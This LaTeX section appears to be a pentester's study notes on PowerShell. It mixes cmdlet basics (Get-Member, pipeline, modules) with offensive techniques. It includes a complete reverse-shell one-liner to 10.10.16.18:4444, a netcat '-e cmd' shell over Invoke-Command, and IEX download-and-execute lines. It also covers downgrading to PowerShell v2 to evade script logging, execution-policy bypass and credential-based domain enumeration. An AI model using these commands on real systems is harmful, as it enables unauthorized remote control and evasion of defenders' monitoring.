\section{PowerShell}
\label{tool:wlol:powershell}


\url{https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters}

\url{https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/00-introduction?view=powershell-7.2}


\subsection{Downgrade Powershell}
\begin{verbatim}
Get-host
powershell.exe -version 2
Get-host
\end{verbatim}
We can now see that we are running an older version of PowerShell from the
output above. Notice the difference in the version reported. It validates we
have successfully downgraded the shell. Let's check and see if we are still
writing logs. The primary place to look is in the
\verb+PowerShell Operational Log+ found under 
\verb+Applications and Services Logs>Microsoft>Windows>PowerShell> Operational+.
All commands executed in our session will log to this file. 
The \verb+Windows PowerShell+ log located at 
\verb+Applications and Services Logs > Windows PowerShell+ is also a good place
to check. An entry will be made here when we start an instance of PowerShell.
In the image below, we can see the red entries made to the log from the current
PowerShell session and the output of the last entry made at 2:12 pm when the
downgrade is performed. It was the last entry since our session moved into a
version of PowerShell no longer capable of logging. Notice that, that event
corresponds with the last event in the \verb+Windows PowerShell+ log entries.

With
\href{https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2}{Script
Block Logging} enabled, we can see that whatever we type into the terminal gets
sent to this log. If we downgrade to PowerShell V2, this will no longer
function correctly. Our actions after will be masked since Script Block Logging
does not work below PowerShell 3.0. Notice above in the logs that we can see
the commands we issued during a normal shell session, but it stopped after
starting a new PowerShell instance in version 2. Be aware that the action of
issuing the command \verb+powershell.exe -version 2+ within the PowerShell
session will be logged. So evidence will be left behind showing that the
downgrade happened, and a suspicious or vigilant defender may start an
investigation after seeing this happen and the logs no longer filling up for
that instance. We can see an example of this in the image below. Items in the
red box are the log entries before starting the new instance, and the info in
green is the text showing a new PowerShell session was started in HostVersion
2.0.

\subsection{Commands}
Check Language Mode (Full or Constrained)
\begin{verbatim}
$ExecutionContext.SessionState.LanguageMode
\end{verbatim}

Lists available modules loaded for use.
\begin{verbatim}
Get-Module 
\end{verbatim}


 print the execution policy settings for each scope on a host.
\begin{verbatim}
Get-ExecutionPolicy -List 	
\end{verbatim}

change the policy for the current process using the \verb+-Scope+ parameter. Doing so
will revert the policy once we vacate the process or terminate it. This is
ideal because it won't make a permanent change to the victim host.
\begin{verbatim}
Set-ExecutionPolicy Bypass -Scope Process 	
\end{verbatim}

Get the specified user's PowerShell history. 
\begin{verbatim}
Get-Content 
    C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt 
\end{verbatim}

Return environment values such as key paths, users, computer information, etc.
\begin{verbatim}
Get-ChildItem Env: | ft Key,Value 
\end{verbatim}

Download a file from the web using PowerShell and call it from memory.

\begin{verbatim}
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); `
    <follow-on commands>" 
\end{verbatim}


add a .NET framework class to our PowerShell session (i\verb+AssemblyName+
parameter allows to specify an assembly that contains types needed)

\begin{verbatim}
Add-Type -AssemblyName System.IdentityModel
\end{verbatim}

\subsection{Reverseshell}


\href{https://podalirius.net/en/articles/windows-reverse-shells-cheatsheet/}{Reverseshell
builder}

\begin{verbatim}
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.18',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
\end{verbatim}

\subsection{Establishing WinRM Session}
\label{tool:wlol:powershell:cmdlet:winrm-session}

href{https://docs.microsoft.com/en-us/powershell/module/microsoft.wsman.management/test-wsman?view=powershell-7.2}{Test-WsMan}

 \href{https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2}{Enter-PSSession}

\begin{verbatim}
Get-PSSession -ComputerName COMPUTER_NAME -Credential $cred


New-PSSession -ComputerName COMPUTER_NAME
$pass = ConvertTo-SecureString "PASSWD" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("DOMAIN\LOGIN", $pass)
Enter-PSSession -ComputerName COMPUTER_NAME -Credential $cred

# Invoking command on another machine:

Invoke-Command -computername COMPUTER_NAME  -credential $cred ` 
    -ScriptBlock{.\nc64.exe -e cmd IP PORT}

# OR 
$sess = New-PSSession -ComputerName COMPUTER_NAME
invoke-Command -ScriptBlock {whoami} -Session $sess

# Get Computers list that curent user has access to:
$computers=( Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select  -ExpandProperty ds_cn)
foreach ($computer in $computers) { (Get-WmiObject Win32_ComputerSystem -ComputerName $computer ).Name }

# Get Computers list that target user has access to:
$Username = 'domain\user'
$Password = ConvertTo-SecureString -AsPlainText 'password'-Force
$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username,$Password
$computers=( Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select  -ExpandProperty ds_cn)
foreach ($computer in $computers) { (Get-WmiObject Win32_ComputerSystem -ComputerName $computer -Credential $cred ).Name }
# List endpoint that a group has access
Get-PSSessionConfiguration |where {$_.Permission -match 'Remote Management Users'}

\end{verbatim}


\subsection{errors}
\begin{verbatim}
$error[0]
\end{verbatim}
\subsection{Locate commands}

\begin{itemize}
 \item \verb+Get-Verb+: lists all of the available cmdlets on your system 
\begin{verbatim}
Get-Command -Noun <pattern>
Get-Command -Verb <verb>
# Commands which accept Object as input
Get-Command -ParameterType <Object> 
Get-Command -Module ActiveDirectory

\end{verbatim}
 \item \verb+Get-Command+
  \item \verb+Get-Help+: helps to learn how to use commands but also to locate
      commands
\begin{verbatim}
Get-Help -Name Get-Help
Get-Help *-process
\end{verbatim}
 \item \verb+Get-Member+:
\end{itemize}


\subsection{Download a file}
\begin{verbatim}
IEX (New-Object Net.WebClient).DownloadString('http://werbserver:80/PowerView.ps1')
\end{verbatim}

\subsection{Discovering objects, properties, and methods}

\verb+Get-Member+ helps you discover what objects, properties, and methods are
available for commands. Any command that produces object-based output can be
piped to \verb+Get-Member+

Plain use will return the Object return by the cmdlet and it definition

\subsubsection{Properties}
\verb+Get-Member -MemberType Properties+


\verb+Select-Object+ will allow to display more properties on the object.

\begin{verbatim}
 <cmdlet> | Select-Object -Property *
 <cmdlet> | Select-Object -Property <prop_1>, .. ., <prop_n>, <str>*
\end{verbatim}

\subsubsection{Methods}

\verb+Get-Member -MemberType Method+

Methods are an action that can be taken

\verb+(<cmdlet>).<method>()+

A better option is to use a cmdlet to perform the action if one exists

\verb+Get-Service -Name w32time | Start-Service -PassThru+

\subsubsection*{Variable affectation}

\verb+$<var> = <cmdlet>+

\subsection{One-liners and the pipeline}

\subsubsection{One-Liners}
A PowerShell one-liner is one continuous pipeline and not necessarily a command
that's on one physical line.
Natural line breaks can occur at commonly used characters including pipe (|) comma (,)
and opening brackets ([), braces ({), and parenthesis ((). Others that aren't so common include the semicolon (;), equals sign (=), and both opening single and double quotes (',").

\subsubsection{Filtering Left}
\verb+Get-Service -Name w32time+ can be rewritten 
\verb+Get-Service | >here-Object Name -eq w32time+ but it's less optimized
    
\subsubsection{The Pipeline}

For command accepting inputs and epending on how thorough a commands help is, it may include an INPUTS and OUTPUTS section.

\verb+help Stop-Service -Full+ will show what parameter accept pipeline. Cmdlet
may accept several input parameters (see \verb+help Stop-Service -Full+)

can be \verb+ByPropertyName+ or  \verb+ByValue+. When both ByValue is tryed
first \verb+ByValue+ as to be understood as verb+by type+.

PowerShell will map the input object to the property according to its type.

\subsubsection{PowerShellGet}
PowerShellGet is a PowerShell module that contains commands for discovering,
installing, publishing, and updating PowerShell modules (and other artifacts)
to or from a NuGet repository such as
\href{https://www.powershellgallery.com/}{PowerShell Gallery}. 

\begin{verbatim}
Find-Module -Name <Name>
Find-Module -Name <Name> | Install-Module
\end{verbatim}


\subsubsection{Formatting, aliases, providers, comparison}

\url{https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/05-formatting-aliases-providers-comparison?view=powershell-7.2}

\subsection{links}

\url{https://www.tutorialspoint.com/powershell/powershell_cmdlets.htm}
